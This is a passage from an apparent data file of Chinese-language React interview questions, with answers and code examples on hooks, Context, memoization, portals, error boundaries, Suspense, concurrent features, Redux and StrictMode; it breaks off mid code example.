                keyPoints: ['useMemo 缓存值', 'useCallback 缓存函数引用', '仅用于开销大计算或 memo 子组件', '过度使用反而降性能'],
              },
              {
                id: 'react-useref',
                domain: 'react',
                question: 'useRef 的作用是什么？和 useState 有什么区别？',
                shortAnswer: 'useRef 返回一个 .current 可变对象，修改不触发重渲染。用于：1) 访问 DOM 2) 保存可变值不触发渲染 3) 保存定时器/最新值。与 useState 区别：ref 变化不触发渲染，state 变化触发。',
                detailedAnswer: 'useRef 作用：\n\n1. 访问 DOM 元素：\nconst inputRef = useRef(null)\n<input ref={inputRef} />\ninputRef.current.focus()\n\n2. 保存可变值（不触发渲染）：\nconst renderCount = useRef(0)\nrenderCount.current++ // 不触发重渲染\n\n3. 保存定时器 ID / 最新值（避免闭包陷阱）：\nconst timerRef = useRef(null)\ntimerRef.current = setInterval(...)\n\n4. 跨渲染周期保存实例（如 WebSocket、第三方库实例）\n\nuseRef vs useState：\n\n| 维度 | useRef | useState |\n|------|--------|----------|\n| 修改触发渲染 | 否 | 是 |\n| 用途 | DOM/可变值/实例 | 响应式状态 |\n| 更新方式 | 直接改 .current | 调用 setter |\n| 重新渲染 | 不触发 | 触发 |\n| 初次值 | useRef(initial) | useState(initial) |\n\n注意：\n- useRef 的 initial 值只在首次渲染时赋值，后续忽略\n- 不要在渲染过程中读写 ref.current（副作用中读写）\n- ref.current 变化不会触发 UI 更新，需手动管理\n- 函数组件卸载时需手动清理 ref（定时器、事件监听）',
                codeExample: `// 1. DOM 访问
function Input() {
  const ref = useRef<HTMLInputElement>(null)
  return <input ref={ref} onBlur={() => ref.current?.focus()} />
}

// 2. 保存可变值（不触发渲染）
function Timer() {
  const count = useRef(0)
  // count.current++ 不会重渲染，但可用于日志/计算
}

// 3. 避免闭包陷阱
function Polling() {
  const [data, setData] = useState(null)
  const latestData = useRef(data)
  latestData.current = data // 始终保持最新
  useEffect(() => {
    const timer = setInterval(() => {
      console.log(latestData.current) // 拿到最新值
    }, 1000)
    return () => clearInterval(timer)
  }, []) // 空依赖，不会闭包旧值
}`,
                difficulty: 'easy',
                tags: ['useRef', 'DOM', '闭包陷阱'],
                keyPoints: ['ref 变化不触发渲染', '用于 DOM 访问', '保存可变值不触发渲染', '避免闭包陷阱'],
              },
              {
                id: 'react-context',
                domain: 'react',
                question: 'Context API 的原理是什么？有什么性能问题？如何优化？',
                shortAnswer: 'Context 提供跨组件数据传递，避免 props 逐层透传。性能问题：Provider 值变化会导致所有消费组件重渲染。优化：拆分 Context、用 useMemo 缓存值、selector 模式（use-context-selector）。',
                detailedAnswer: 'Context 原理：\n\n1. createContext(defaultValue) 创建 Context 对象\n2. Provider 组件提供值，内部组件可消费\n3. Consumer 组件或 useContext Hook 获取值\n4. 消费组件订阅 Provider，值变化时自动重渲染\n\n性能问题：\n- Provider 的 value 变化时，所有 useContext 消费的组件都会重渲染\n- 即使组件只用 value 的一部分，整体变化也触发重渲染\n- 嵌套 Provider 时，上层变化导致全树重渲染\n\n优化方案：\n\n1. 拆分 Context：将不相关数据分到不同 Context\n   - UserContext（用户信息）\n   - ThemeContext（主题）\n   - 互不影响，各自更新\n\n2. useMemo 缓存 value：避免每次 render 创建新对象\n   const value = useMemo(() => ({ user, setUser }), [user])\n   <Provider value={value}>\n\n3. selector 模式：use-context-selector 库\n   - 只在选择的字段变化时重渲染\n   - const name = useContextSelector(UserContext, v => v.name)\n\n4. 状态管理库替代：Redux/Zustand/Jotai 精准订阅\n\n适用场景：\n- 主题、语言、用户信息等低频变化数据 → Context 合适\n- 高频变化数据（如购物车、实时数据）→ 用状态管理库\n- 简单项目 → Context 足够\n- 复杂项目 → Redux/Zustand 精准更新更好',
                codeExample: `// 1. 拆分 Context 优化
const UserContext = createContext()
const ThemeContext = createContext()

function App() {
  return (
    <ThemeContext.Provider value={theme}>
      <UserContext.Provider value={user}>
        <Page />
      </UserContext.Provider>
    </ThemeContext.Provider>
  )
}

// 2. useMemo 缓存 value
function Provider({ children }) {
  const [user, setUser] = useState(null)
  const value = useMemo(() => ({ user, setUser }), [user])
  return <UserContext.Provider value={value}>{children}</UserContext.Provider>
}

// 3. 消费
function Profile() {
  const { user } = useContext(UserContext)
  return <div>{user.name}</div>
}`,
                difficulty: 'medium',
                tags: ['Context', '性能优化', '跨组件通信'],
                keyPoints: ['Context 跨组件传值', 'value 变化全消费组件重渲染', '拆分 Context + useMemo 优化', '高频数据用状态管理库'],
              },
              {
                id: 'react-memo-purecomponent',
                domain: 'react',
                question: 'React.memo、PureComponent、shouldComponentUpdate 三者的区别和联系？',
                shortAnswer: 'React.memo 包裹函数组件做浅比较 props；PureComponent 是类组件基类自动浅比较 state+props；shouldComponentUpdate 是类组件手动控制是否重渲染。三者本质都是减少不必要渲染。',
                detailedAnswer: '三者都是性能优化手段，减少不必要的子组件重渲染：\n\n1. React.memo（函数组件）：\n- 高阶组件，包裹函数组件\n- 默认浅比较 props，相同则跳过渲染\n- 可传第二参数自定义比较函数 areEqual(prevProps, nextProps)\n- const MemoComp = React.memo(MyComp)\n- const MemoComp = React.memo(MyComp, (prev, next) => prev.id === next.id)\n\n2. PureComponent（类组件）：\n- 继承 React.PureComponent 替代 React.Component\n- 自动浅比较 props 和 state\n- 不可重写 shouldComponentUpdate（已内置）\n- 浅比较：Object.is 逐字段比较，嵌套对象引用不同则视为变化\n\n3. shouldComponentUpdate（类组件）：\n- 生命周期方法，手动控制是否重渲染\n- 返回 true 重渲染，false 跳过\n- 可自定义深层比较逻辑\n- 比 PureComponent 更灵活但需手动实现\n\n三者联系：\n- React.memo（函数组件）≈ PureComponent（类组件）≈ shouldComponentUpdate 返回浅比较结果\n- 本质：在 React diff 之前拦截，跳过子树协调\n\n注意事项：\n- 浅比较对嵌套对象/数组无效（引用不同即视为变化）\n- 传函数/对象 props 时需配合 useCallback/useMemo\n- 过度 memo 有内存和比较开销，需 Profiler 验证\n- React Compiler（19+）可自动优化，减少手动 memo',
                codeExample: `// 1. React.memo（函数组件）
const MyComponent = React.memo(function MyComponent(props) {
  return <div>{props.name}</div>
})
// 自定义比较
const MemoComp = React.memo(Comp, (prev, next) => prev.id === next.id)

// 2. PureComponent（类组件）
class MyComponent extends React.PureComponent {
  render() { return <div>{this.props.name}</div> }
}

// 3. shouldComponentUpdate（类组件）
class MyComponent extends React.Component {
  shouldComponentUpdate(nextProps, nextState) {
    return this.props.id !== nextProps.id // 仅 id 变化才更新
  }
  render() { return <div>{this.props.name}</div> }
}`,
                difficulty: 'medium',
                tags: ['React.memo', 'PureComponent', 'shouldComponentUpdate', '性能优化'],
                keyPoints: ['React.memo 函数组件浅比较', 'PureComponent 类组件自动浅比较', 'shouldComponentUpdate 手动控制', '浅比较对嵌套对象无效'],
              },
              {
                id: 'react-portal',
                domain: 'react',
                question: 'createPortal 的作用是什么？常见的使用场景有哪些？',
                shortAnswer: 'createPortal 将子组件渲染到 DOM 树的其他位置（而非父组件 DOM 层级内）。场景：Modal/Dialog、Tooltip、Toast、全局通知、弹窗。解决 z-index 层叠和 overflow 裁剪问题。',
                detailedAnswer: 'createPortal 原理：\n\nReactDOM.createPortal(child, container)\n- child：React 子元素\n- container：真实 DOM 容器（通常是 document.body）\n- 渲染结果：child 被渲染到 container 中，而非父组件的 DOM 层级内\n- 但 React 事件冒泡仍按组件树（非 DOM 树）传播\n\n为何需要 Portal：\n\n1. z-index 层叠问题：\n- 父组件 overflow: hidden 或 z-index 低时，子元素弹窗被裁切/遮挡\n- Portal 渲染到 body，脱离父组件层级，避免层叠上下文问题\n\n2. 语义和样式隔离：\n- Modal 应在 DOM 树最外层，不被父组件样式影响\n- 避免父组件的 transform/filter 创建新层叠上下文\n\n常见使用场景：\n- Modal / Dialog / Drawer\n- Tooltip / Popover\n- Toast / Notification\n- 全局 Loading\n- 右键菜单 ContextMenu\n- 全屏遮罩\n\n事件冒泡特性：\n- Portal 内的事件仍按 React 组件树冒泡（非 DOM 树）\n- 父组件的 onClick 仍能捕获 Portal 内的点击\n- 这使得 Portal 内的交互能被父组件正常处理\n\n注意事项：\n- 卸载时需清理 Portal 容器（React 自动处理）\n- SSR 环境 Portal 需在 useEffect 中渲染（无 document）\n- aria 语义：Modal 需配合 role="dialog" aria-modal="true"',
                codeExample: `import { createPortal } from "react-dom"

function Modal({ open, onClose, children }) {
  if (!open) return null
  return createPortal(
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content" onClick={(e) => e.stopPropagation()}>
        {children}
      </div>
    </div>,
    document.body // 渲染到 body
  )
}

// 使用
function App() {
  const [open, setOpen] = useState(false)
  return (
    <div style={{ overflow: "hidden", zIndex: 1 }}>
      <button onClick={() => setOpen(true)}>打开</button>
      <Modal open={open} onClose={() => setOpen(false)}>
        <p>弹窗内容</p>
      </Modal>
    </div>
  )
}`,
                difficulty: 'easy',
                tags: ['Portal', 'Modal', 'DOM'],
                keyPoints: ['Portal 渲染到 DOM 其他位置', '解决 z-index 和 overflow 问题', '事件按组件树冒泡', '场景：Modal/Tooltip/Toast'],
              },
              {
                id: 'react-error-boundary',
                domain: 'react',
                question: '错误边界（Error Boundary）是什么？能捕获哪些错误？不能捕获哪些？',
                shortAnswer: '错误边界是类组件，用 static getDerivedStateFromError + componentDidCatch 捕获子组件树渲染错误。能捕获渲染/生命周期错误；不能捕获事件处理/异步/setTimeout/SSR 错误。',
                detailedAnswer: '错误边界（Error Boundary）：\n\n- React 组件树中某部分发生 JS 错误时，不应导致整个应用崩溃\n- 错误边界是类组件，捕获子组件树的 JS 错误并显示降级 UI\n\n实现方式（类组件）：\n1. static getDerivedStateFromError(error)：渲染阶段调用，返回新 state（hasError: true）\n2. componentDidCatch(error, info)：提交后调用，用于副作用（日志上报）\n\n能捕获的错误：\n- 子组件渲染过程中的错误\n- 生命周期方法中的错误\n- 子组件树中构造函数的错误\n\n不能捕获的错误：\n- 事件处理函数中的错误（用 try/catch）\n- 异步代码（setTimeout/Promise.then/requestAnimationFrame）\n- 服务端渲染（SSR）错误\n- 错误边界自身的错误（只能由上层错误边界捕获）\n\n使用方式：\n- 用 ErrorBoundary 组件包裹需要保护的区域\n- 可嵌套多层，内层捕获后显示降级 UI，不影响外层\n- 结合 Sentry 等监控平台在 componentDidCatch 中上报错误\n\n最佳实践：\n- 在路由级别包裹 ErrorBoundary，一个页面崩溃不影响其他页面\n- 关键组件单独包裹，精细控制降级范围\n- 降级 UI 提供恢复按钮（重置 state）\n- React 19 新增 useErrorBoundary 等（或第三方 react-error-boundary 库）',
                codeExample: `class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props)
    this.state = { hasError: false }
  }

  static getDerivedStateFromError(error) {
    return { hasError: true } // 更新 state 触发降级 UI
  }

  componentDidCatch(error, errorInfo) {
    console.error("Error caught:", error, errorInfo)
    // 上报到监控平台
  }

  render() {
    if (this.state.hasError) {
      return <h1>Something went wrong.</h1>
    }
    return this.props.children
  }
}

// 使用
function App() {
  return (
    <ErrorBoundary>
      <MyComponent />
    </ErrorBoundary>
  )
}`,
                difficulty: 'medium',
                tags: ['Error Boundary', '错误处理', '面试必考'],
                keyPoints: ['类组件捕获渲染错误', '不能捕获事件/异步错误', 'getDerivedStateFromError 降级', 'componentDidCatch 上报'],
              },
              {
                id: 'react-suspense-lazy',
                domain: 'react',
                question: 'React.lazy 和 Suspense 如何实现代码分割？Suspense 还能用于什么？',
                shortAnswer: 'React.lazy 动态 import 组件实现按需加载，Suspense 包裹显示 loading fallback。Suspense 还可用于数据获取（React 18+，配合 use）和流式 SSR。',
                detailedAnswer: 'React.lazy 代码分割：\n\nconst LazyComp = React.lazy(() => import("./MyComp"))\n- 动态 import 返回 Promise，resolve 后加载组件\n- 需配合 Suspense 使用，加载期间显示 fallback\n\nSuspense 用法：\n<Suspense fallback={<Loading />}>\n  <LazyComp />\n</Suspense>\n- fallback：加载期间显示的 UI\n- 可嵌套，最近的 Suspense 捕获\n\n代码分割策略：\n1. 路由级分割：每个路由页面 lazy import\n2. 组件级分割：大组件/第三方库（如编辑器、图表）按需加载\n3. 条件加载：根据条件动态加载\n\nSuspense 的其他用途（React 18+）：\n\n1. 数据获取：\n- 组件 throw Promise，Suspense 捕获并显示 fallback\n- Promise resolve 后重新渲染组件\n- 配合 React 19 的 use() Hook 使用\n- 或用 React Query / SWR 的 Suspense 模式\n\n2. 流式 SSR：\n- renderToPipeableStream 逐步输出 HTML\n- Suspense 边界内未就绪的部分先发 fallback\n- 数据就绪后流式替换为真实内容\n- 提升首屏 TTFB\n\n3. Transition 结合：\n- useTransition 标记为非紧急更新\n- Suspense 展示旧 UI 直到新内容就绪\n- 避免 loading 闪烁\n\n注意事项：\n- React.lazy 仅默认导出（export default）\n- SSR 环境需用 loadable-components 或 Next.js dynamic\n- 过度分割会增加请求次数，需平衡',
                codeExample: `// 1. 代码分割
const LazyChart = React.lazy(() => import("./HeavyChart"))

function App() {
  return (
    <Suspense fallback={<div>Loading chart...</div>}>
      <LazyChart data={data} />
    </Suspense>
  )
}

// 2. 路由级分割
const Home = React.lazy(() => import("./pages/Home"))
const About = React.lazy(() => import("./pages/About"))

function Routes() {
  return (
    <Suspense fallback={<Spinner />}>
      <Route path="/" component={Home} />
      <Route path="/about" component={About} />
    </Suspense>
  )
}

// 3. 嵌套 Suspense
<Suspense fallback={<PageSkeleton />}>
  <Header />
  <Suspense fallback={<ContentSkeleton />}>
    <LazyContent />
  </Suspense>
</Suspense>`,
                difficulty: 'medium',
                tags: ['Suspense', 'React.lazy', '代码分割', 'SSR'],
                keyPoints: ['React.lazy 动态 import', 'Suspense 显示 fallback', '可用于数据获取和流式 SSR', '路由级/组件级分割'],
              },
              {
                id: 'react-concurrent-features',
                domain: 'react',
                question: 'React 18 的并发特性有哪些？useTransition 和 useDeferredValue 的区别？',
                shortAnswer: 'React 18 并发特性：自动批处理、Transitions、Suspense for Data、useDeferredValue、useSyncExternalStore。useTransition 标记状态更新为非紧急（在 setter 级别）；useDeferredValue 延迟响应某个值（在值级别）。',
                detailedAnswer: 'React 18 并发特性：\n\n1. 自动批处理（Automatic Batching）：\n- 所有场景的 setState 自动批处理（含 setTimeout/Promise/原生事件）\n- React 17 仅合成事件批处理\n\n2. Transitions（过渡）：\n- 将状态更新标记为非紧急（transition）\n- 紧急更新（如输入）立即响应，非紧急更新（如列表过滤）可中断\n- useTransition / startTransition\n\n3. Suspense for Data Fetching：\n- 组件 throw Promise，Suspense 捕获\n- 配合 use() Hook 获取异步数据\n\n4. useDeferredValue：\n- 延迟更新某个值，类似防抖但基于渲染优先级\n\n5. useSyncExternalStore：\n- 安全地订阅外部 store（Redux/Zustand）\n- 解决 tearing（撕裂）问题\n\n6. 流式 SSR：\n- renderToPipeableStream 逐步输出\n- Suspense 边界流式替换\n\nuseTransition vs useDeferredValue：\n\n| 维度 | useTransition | useDeferredValue |\n|------|---------------|------------------|\n| 控制层级 | setter 级别 | 值级别 |\n| 用法 | const [isPending, startTransition] = useTransition() | const deferred = useDeferredValue(value) |\n| 场景 | 你控制状态更新代码 | 你只收到值（如 props） |\n| isPending | 有（可显示 pending 状态） | 无 |\n\nuseTransition 示例（搜索框）：\n- 输入框值更新：紧急（立即响应打字）\n- 搜索结果列表更新：非紧急（startTransition 包裹）\n- 大列表渲染时可被输入打断，保持流畅\n\nuseDeferredValue 示例（接收 props）：\n- 子组件收到 props.query\n- 用 useDeferredValue 延迟 query\n- 父组件紧急更新 input，子组件延迟渲染列表\n\n设计理念：\n- 紧急更新：用户直接交互（输入、点击）\n- 非紧急更新：UI 过渡（列表过滤、页面切换）\n- 并发渲染让紧急更新优先，非紧急可中断/恢复',
                codeExample: `// 1. useTransition
function Search() {
  const [query, setQuery] = useState("")
  const [results, setResults] = useState([])
  const [isPending, startTransition] = useTransition()

  function handleChange(e) {
    setQuery(e.target.value) // 紧急：立即更新输入框
    startTransition(() => {
      setResults(filter(hugeList, e.target.value)) // 非紧急：延迟更新列表
    })
  }

  return (
    <>
      <input value={query} onChange={handleChange} />
      {isPending ? <Spinner /> : <List items={results} />}
    </>
  )
}

// 2. useDeferredValue
function SearchResults({ query }) {
  const deferredQuery = useDeferredValue(query)
  const results = useMemo(() => filter(hugeList, deferredQuery), [deferredQuery])
  return <List items={results} />
}`,
                difficulty: 'hard',
                tags: ['React18', 'Concurrent', 'useTransition', 'useDeferredValue'],
                keyPoints: ['React 18 并发特性', 'useTransition setter 级别', 'useDeferredValue 值级别', '紧急 vs 非紧急更新'],
              },
              {
                id: 'react-key-optimization',
                domain: 'react',
                question: 'React 中 key 的作用是什么？用 index 作 key 有什么问题？',
                shortAnswer: 'key 帮助 React 识别列表元素变化，复用 DOM 节点。用 index 作 key 在列表增删/重排时会导致：1) 组件状态错乱 2) 性能下降（无法复用）。应使用稳定唯一 ID。',
                detailedAnswer: 'key 的作用：\n- React Diff 算法通过 key 判断列表项是否复用\n- key 相同 → 复用 DOM 节点和组件 state\n- key 不同 → 销毁旧节点，创建新节点\n- key 是 React 识别列表元素的身份标识\n\n用 index 作 key 的问题：\n\n1. 状态错乱：\n- 列表 [A, B, C] → 删除 A → [B, C]\n- index 作 key：B 的 key 从 1 变 0，C 从 2 变 1\n- React 认为位置 0 仍是同一个组件，复用 A 的 state 给 B\n- 输入框内容、组件内部状态错乱\n\n2. 性能下降：\n- 增删/重排时，index 变化导致大量节点无法复用\n- 本可复用的节点被销毁重建\n- 特别是含复杂子组件时性能开销大\n\n3. 动画异常：\n- CSS transition 基于真实 DOM 节点\n- key 变化导致节点重建，动画中断\n\n何时可用 index 作 key（安全场景）：\n- 列表纯展示，无增删/重排\n- 列表项无 state（纯函数组件）\n- 列表项无动画\n- 列表永不变化（静态）\n\n正确做法：\n- 使用数据本身的稳定唯一 ID（如 item.id）\n- 无 ID 时用 nanoid/uuid 生成\n- key 只需在兄弟节点间唯一，不需全局唯一\n- key 应稳定（同一数据 key 不变）\n\n注意：\n- key 不传会默认用 index（控制台 warning）\n- key 是 React 内部使用，不会传给组件 props\n- 避免用 Math.random() 作 key（每次渲染都变，全部重建）',
                codeExample: `// ❌ 错误：用 index 作 key
function Bad({ items }) {
  return items.map((item, index) => (
    <ListItem key={index} data={item} />
  ))
  // 删除第一项时，所有项的 key 变化，state 错乱
}

// ✅ 正确：用稳定唯一 ID
function Good({ items }) {
  return items.map((item) => (
    <ListItem key={item.id} data={item} />
  ))
}

// 状态错乱示例
// 列表：[{id:1, text:"A"}, {id:2, text:"B"}]
// 输入框1 输入 "X"，输入框2 输入 "Y"
// 删除第一项 → [{id:2, text:"B"}]
// index 作 key：B 复用位置0的组件，显示 "X"（A 的 state）← 错误
// id 作 key：B 的 key=2，React 知道 A 被删除，B 保留，显示 "Y" ← 正确`,
                difficulty: 'medium',
                tags: ['key', 'Diff', '列表渲染', '面试必考'],
                keyPoints: ['key 标识列表元素身份', 'index 作 key 导致状态错乱', '用稳定唯一 ID', 'key 需兄弟节点间唯一'],
              },
              {
                id: 'react-forward-ref',
                domain: 'react',
                question: 'forwardRef 和 useImperativeHandle 的作用是什么？',
                shortAnswer: 'forwardRef 允许函数组件接收 ref 并转发给子 DOM/组件（函数组件默认不能接 ref）。useImperativeHandle 自定义暴露给父组件的 ref 实例值（而非整个 DOM），实现方法封装和限制访问。',
                detailedAnswer: 'forwardRef：\n\n- 问题：函数组件没有实例，默认不能接收 ref（ref 会挂到 props.ref 而非组件实例）\n- 解决：forwardRef 包裹函数组件，第二参数接收 ref\n- 用途：将父组件的 ref 转发给子组件内部的 DOM 元素或子组件\n\nconst MyInput = React.forwardRef((props, ref) => {\n  return <input ref={ref} {...props} />\n})\n// 父组件：<MyInput ref={inputRef} /> → inputRef.current 指向 input DOM\n\nuseImperativeHandle：\n\n- 问题：forwardRef 直接暴露整个 DOM 节点，父组件可任意操作（不安全/不符合封装）\n- 解决：useImperativeHandle 自定义 ref.current 的值，只暴露需要的方法\n- 用途：封装组件内部实现，只暴露特定 API\n\nconst MyInput = React.forwardRef((props, ref) => {\n  const inputRef = useRef(null)\n  useImperativeHandle(ref, () => ({\n    focus: () => inputRef.current?.focus(),\n    clear: () => { inputRef.current.value = "" },\n    getValue: () => inputRef.current.value,\n  }))\n  return <input ref={inputRef} {...props} />\n})\n// 父组件：inputRef.current.focus() // 只能调用暴露的方法\n\n配合场景：\n- 表单组件：暴露 validate()、reset()、focus()\n- 播放器组件：暴露 play()、pause()、seek()\n- 滚动容器：暴露 scrollToTop()\n- 限制父组件对内部 DOM 的直接操作\n\nReact 19 变化：\n- React 19 中 ref 可直接作为 props 传递（无需 forwardRef）\n- 函数组件可直接通过 props.ref 访问\n- forwardRef 仍可用但不推荐（将废弃）\n- useImperativeHandle 仍需要 ref 参数\n\n注意：\n- useImperativeHandle 第三参数可传依赖数组（useImperativeHandle(ref, create, [deps])）\n- 过度使用会破坏数据流，优先用 props 控制而非命令式调用\n- TypeScript 中需定义 Ref 接口类型',
                codeExample: `// 1. forwardRef 基本用法
const MyInput = React.forwardRef((props, ref) => (
  <input ref={ref} {...props} />
))

function Parent() {
  const ref = useRef(null)
  return <MyInput ref={ref} /> // ref 指向 input DOM
}

// 2. useImperativeHandle 封装
const FancyInput = React.forwardRef((props, ref) => {
  const inputRef = useRef(null)
  useImperativeHandle(ref, () => ({
    focus: () => inputRef.current?.focus(),
    clear: () => { inputRef.current.value = "" },
  }))
  return <input ref={inputRef} {...props} />
})

function Parent() {
  const ref = useRef(null)
  return (
    <>
      <FancyInput ref={ref} />
      <button onClick={() => ref.current?.focus()}>Focus</button>
      <button onClick={() => ref.current?.clear()}>Clear</button>
    </>
  )
}`,
                difficulty: 'medium',
                tags: ['forwardRef', 'useImperativeHandle', 'ref'],
                keyPoints: ['forwardRef 转发 ref 给函数组件', 'useImperativeHandle 自定义暴露值', '封装组件 API', 'React 19 ref 可作 props'],
              },
              {
                id: 'react-redux-hooks',
                domain: 'react',
                question: 'Redux 中 connect 和 useSelector/useDispatch 的区别？React-Redux 如何实现精准订阅？',
                shortAnswer: 'connect 是 HOC 方式（mapStateToProps/mapDispatchToProps），useSelector/useDispatch 是 Hooks 方式。精准订阅靠 useSelector 的 selector + 引用相等性检查（===），仅选中的切片变化才重渲染。',
                detailedAnswer: 'connect（传统 HOC 方式）：\n- connect(mapStateToProps, mapDispatchToProps)(Component)\n- mapStateToProps：从 store state 选数据注入 props\n- mapDispatchToProps：注入 action creators 到 props\n- 默认做浅比较（ownProps + stateProps），变化才重渲染\n- 适合类组件\n\nuseSelector/useDispatch（Hooks 方式，React-Redux 7.1+）：\n- const data = useSelector(state => state.user)\n- const dispatch = useDispatch()\n- 更简洁，不需要 HOC 包裹\n- 适合函数组件\n\n精准订阅原理：\n1. React-Redux 内部用 useSyncExternalStore 订阅 Redux store\n2. useSelector 每次渲染执行 selector，对比前后返回值\n3. 默认用 === 比较，不同才触发重渲染\n4. 可传第二参数 equalityFn 自定义比较（如 shallowEqual）\n\nselector 最佳实践：\n- 返回基本类型或稳定引用：const name = useSelector(s => s.user.name)\n- 避免每次返回新对象：useSelector(s => ({a: s.a, b: s.b})) // 每次新引用，无限重渲染\n- 解决方案：\n  a) 拆成多个 useSelector：useSelector(s => s.a); useSelector(s => s.b)\n  b) 用 reselect 的 createSelector 做 memoized selector\n  c) 传 shallowEqual：useSelector(selector, shallowEqual)\n\nRedux Toolkit（RTK）：\n- 官方推荐，简化 Redux 模板代码\n- createSlice 自动生成 action/reducer\n- configureStore 开箱即用（含 redux-thunk、devtools）\n- createAsyncThunk 处理异步\n- RTK Query 数据获取（类似 React Query）',
                codeExample: `// 1. connect 方式（类组件）
const mapState = (state) => ({ user: state.user })
const mapDispatch = { fetchUser }
export default connect(mapState, mapDispatch)(UserProfile)

// 2. Hooks 方式（推荐）
function UserProfile() {
  const user = useSelector((state) => state.user)
  const dispatch = useDispatch()
  useEffect(() => dispatch(fetchUser()), [dispatch])
  return <div>{user.name}</div>
}

// 3. 避免新引用问题
// ❌ 每次返回新对象
const { a, b } = useSelector((s) => ({ a: s.a, b: s.b })) // 无限重渲染
// ✅ 拆分
const a = useSelector((s) => s.a)
const b = useSelector((s) => s.b)
// ✅ shallowEqual
const { a, b } = useSelector((s) => ({ a: s.a, b: s.b }), shallowEqual)
// ✅ reselect memoized
const selectAB = createSelector([(s) => s.a, (s) => s.b], (a, b) => ({ a, b }))
const { a, b } = useSelector(selectAB)`,
                difficulty: 'medium',
                tags: ['Redux', 'useSelector', 'connect', '状态管理'],
                keyPoints: ['connect HOC vs Hooks', 'useSelector === 比较精准订阅', '避免返回新对象', 'RTK 简化模板'],
              },
              {
                id: 'react-usereducer-context',
                domain: 'react',
                question: '如何用 useReducer + Context 实现全局状态管理？与 Redux 相比有何优劣？',
                shortAnswer: 'useReducer 管理 state + dispatch，通过 Context 传递给子树。优势：无依赖、轻量、与 React 深度整合。劣势：无中间件、无 devtools、性能需手动优化（Context 全消费重渲染）。',
                detailedAnswer: 'useReducer + Context 实现全局状态：\n\n1. 定义 reducer：\nfunction reducer(state, action) {\n  switch(action.type) {\n    case "ADD": return { ...state, count: state.count + 1 }\n    default: return state\n  }\n}\n\n2. 创建 Context：\nconst StateContext = createContext()\nconst DispatchContext = createContext()\n\n3. Provider 包裹：\nfunction StoreProvider({ children }) {\n  const [state, dispatch] = useReducer(reducer, initialState)\n  return (\n    <StateContext.Provider value={state}>\n      <DispatchContext.Provider value={dispatch}>\n        {children}\n      </DispatchContext.Provider>\n    </StateContext.Provider>\n  )\n}\n\n4. 消费：\nconst state = useContext(StateContext)\nconst dispatch = useContext(DispatchContext)\n\n优化：拆分 State 和 Dispatch Context（dispatch 不变，无需重渲染）\n\n与 Redux 对比：\n\n| 维度 | useReducer+Context | Redux |\n|------|---------------------|-------|\n| 依赖 | 无 | redux + react-redux |\n| 中间件 | 无（需自己实现） | 丰富（thunk/saga/logger） |\n| DevTools | 无 | Redux DevTools 时间旅行 |\n| 性能 | Context 全消费重渲染 | 精准订阅（useSelector） |\n| 异步 | 需自己处理 | thunk/saga/RTK Query |\n| 模板代码 | 少 | 多（RTK 简化） |\n| 调试 | 难（无时间旅行） | 易（DevTools） |\n| 适用 | 小型应用 | 中大型应用 |\n\n何时用 useReducer + Context：\n- 小型应用，状态简单\n- 不想引入 Redux 依赖\n- 团队熟悉 React 原生\n- 中间件需求少\n\n何时用 Redux：\n- 中大型应用\n- 需要丰富中间件（异步、日志、持久化）\n- 需要 DevTools 调试\n- 状态逻辑复杂\n\n替代方案：\n- Zustand：轻量、API 简洁、精准订阅\n- Jotai：原子化状态，细粒度\n- Valtio：Proxy 响应式',
                codeExample: `// 1. 定义 reducer 和 Context
const initialState = { count: 0, user: null }

function reducer(state, action) {
  switch (action.type) {
    case "INCREMENT": return { ...state, count: state.count + 1 }
    case "SET_USER": return { ...state, user: action.payload }
    default: return state
  }
}

const StateContext = createContext()
const DispatchContext = createContext()

// 2. Provider
function StoreProvider({ children }) {
  const [state, dispatch] = useReducer(reducer, initialState)
  return (
    <StateContext.Provider value={state}>\n      <DispatchContext.Provider value={dispatch}>\n        {children}\n      </DispatchContext.Provider>\n    </StateContext.Provider>\n  )\n}\n\n// 3. 自定义 Hook 消费\nfunction useStore() {\n  const state = useContext(StateContext)\n  const dispatch = useContext(DispatchContext)\n  return [state, dispatch]\n}\n\n// 4. 使用\nfunction Counter() {\n  const [state, dispatch] = useStore()\n  return <button onClick={() => dispatch({ type: "INCREMENT" })}>{state.count}</button>\n}`,
                difficulty: 'medium',
                tags: ['useReducer', 'Context', '状态管理', 'Redux'],
                keyPoints: ['useReducer + Context 全局状态', '拆分 State/Dispatch Context', '无中间件/DevTools', '适合小型应用'],
              },
              {
                id: 'react-strict-mode',
                domain: 'react',
                question: 'StrictMode 的作用是什么？为什么会双调用（double invoke）？',
                shortAnswer: 'StrictMode 是开发模式下的辅助工具，不渲染可见 UI。双调用：故意多调一次 render/constructor/effect 来暴露副作用问题。仅开发环境，生产无影响。React 18+ 对 effect 也双调用（mount→unmount→mount）。',
                detailedAnswer: 'StrictMode 作用（仅开发环境）：\n\n1. 识别不安全生命周期：\n- 标记 componentWillMount、componentWillReceiveProps、componentWillUpdate 为不安全\n- 控制台 warning\n\n2. 检测废弃 API：\n- 旧 string ref、旧 context API\n- findDOMNode\n\n3. 检测副作用（双调用）：\n- 故意双调用以下来暴露副作用问题：\n  - 类组件 constructor、render、shouldComponentUpdate\n  - 类组件 getDerivedStateFromProps\n  - useState/useMemo/useReducer 的 initializer/updater\n  - useEffect 的 setup 和 cleanup（mount → unmount → mount）\n  - useState 的更新函数\n\n4. 检测 legacy ref 和 legacy context\n\n为何双调用：\n- React 未来可能复用组件实例（如 Offscreen），需确保代码无副作用\n- 双调用让开发者发现：\n  - effect 中未清理的副作用（定时器、订阅）\n  - render 中修改全局变量\n  - 不纯的 reducer/updater\n- 如果双调用后结果不一致，说明有副作用 bug\n\nReact 18 的变化：\n- StrictMode 对 effect 也双调用（mount → unmount → mount）\n- 模拟「组件被隐藏后又显示」的场景\n- 确保 cleanup 正确清理资源\n\n注意：\n- StrictMode 仅在开发模式生效，生产构建中完全无影响\n- 双调用不影响最终结果（render 两次但 DOM 只更新一次）\n- 不需要修复双调用本身，而是修复它暴露的副作用问题\n- 可在局部使用：<StrictMode>只包裹需要检查的部分</StrictMode>',
                codeExample: `// StrictMode 使用
import { StrictMode } from "react"

function App() {
  return (
    <StrictMode>
      <Header />
      <Main />
    </StrictMode>
  )
}

// 双调用暴露的问题示例
function Bad() {
  useEffect(() => {
    // ❌ 未清理定时器，双调用会创建两个
    setInterval(() => console.log("tick"), 1000)
  }, [])
  return <div>Bad</div>
}

function Good() {
  useEffect(() => {
    const timer = setInterval(() => console.log("tick"), 1000)
